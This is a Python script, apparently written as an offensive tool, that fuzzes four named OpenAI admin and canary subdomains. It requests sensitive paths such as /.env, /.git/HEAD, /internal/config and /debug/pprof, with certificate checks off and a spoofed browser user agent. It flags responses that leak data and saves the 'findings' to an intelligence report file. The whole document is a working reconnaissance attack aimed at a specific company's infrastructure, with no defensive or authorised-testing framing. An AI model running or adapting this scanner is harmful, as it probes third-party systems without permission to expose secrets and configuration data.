import aiohttp
import asyncio
import sys
from datetime import datetime
from colorama import Fore, Style, init

# Initialize Colorama
init(autoreset=True)

class AdminFuzzer:
    def __init__(self):
        self.targets = [
            "https://dev.admin.unified-6.api.openai.com",
            "https://admin.unified-6.api.openai.com",
            "https://api.higherlevelapi-canary.unified-6.api.openai.com",
            "https://dev.primaryapi-canary.unified-8.api.openai.com"
        ]
        self.paths = [
            "/health",
            "/healthz",
            "/metrics",
            "/info",
            "/status",
            "/config",
            "/api/config",
            "/internal/config",
            "/debug/pprof",
            "/api/v1/users",
            "/api/v1/models",
            "/admin/dashboard",
            "/swagger.json",
            "/openapi.json",
            "/.env",
            "/.git/HEAD",
            "/actuator/info",
            "/actuator/health",
            "/__debug__",
            "/server-status"
        ]
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*"
        }
        self.findings = []

    async def probe(self, session, base_url, path):
        url = f"{base_url}{path}"
        try:
            async with session.get(url, headers=self.headers, timeout=5, ssl=False) as response:
                status = response.status
                length = 0
                content_type = response.headers.get('Content-Type', '')
                
                # Read a bit of the body to check for leakage
                try:
                    text = await response.text()
                    length = len(text)
                except:
                    text = ""

                # Color coding based on status
                if status == 200:
                    color = Fore.GREEN
                    # Check if it's a generic "OK" or real data
                    if length > 50: # Likely real data
                        print(f"{color}[!] EXPOSED: {url} | Len: {length} | Type: {content_type}{Style.RESET_ALL}")
                        self.findings.append({"url": url, "status": status, "type": "EXPOSED", "data_snippet": text[:100]})
                    else:
                        print(f"{Fore.CYAN}[*] OPEN: {url} | Len: {length} (Likely Healthcheck){Style.RESET_ALL}")
                elif status == 401:
                    print(f"{Fore.YELLOW}[-] 401 Auth Required: {url}{Style.RESET_ALL}")
                elif status == 403:
                    print(f"{Fore.RED}[x] 403 Forbidden: {url}{Style.RESET_ALL}")
                elif status == 404:
                    pass # Ignore 404s to reduce noise
                elif status == 500:
                    print(f"{Fore.MAGENTA}[!] 500 Server Error (Leak Potential): {url}{Style.RESET_ALL}")
                    self.findings.append({"url": url, "status": status, "type": "ERROR_LEAK", "data_snippet": text[:100]})
                
        except Exception as e:
            pass
            # print(f"{Fore.RED}[E] Error {url}: {e}{Style.RESET_ALL}")

    async def run(self):
        print(f"{Fore.CYAN}=== STARTING ADMIN BACKEND FUZZING ==={Style.RESET_ALL}")
        async with aiohttp.ClientSession() as session:
            tasks = []
            for target in self.targets:
                for path in self.paths:
                    tasks.append(self.probe(session, target, path))
            
            await asyncio.gather(*tasks)
        
        # Report
        if self.findings:
            print(f"\n{Fore.GREEN}=== CRITICAL BACKEND FINDINGS ==={Style.RESET_ALL}")
            for f in self.findings:
                print(f"{Fore.GREEN}URL: {f['url']}")
                print(f"Status: {f['status']}")
                print(f"Snippet: {f['data_snippet']}\n{Style.RESET_ALL}")
            
            # Save to file
            with open("Intelligence_Database/OpenAI/Reports/ADMIN_PROBE_RESULTS.md", "w", encoding="utf-8") as f:
                f.write("# ADMIN PROBE RESULTS\n\n")
                for item in self.findings:
                    f.write(f"- **{item['url']}** ({item['status']})\n")
                    f.write(f"  - Snippet: `{item['data_snippet']}`\n")
        else:
            print(f"\n{Fore.YELLOW}No direct backend exposures found on these admin shards.{Style.RESET_ALL}")

if __name__ == "__main__":
    fuzzer = AdminFuzzer()
    asyncio.run(fuzzer.run())
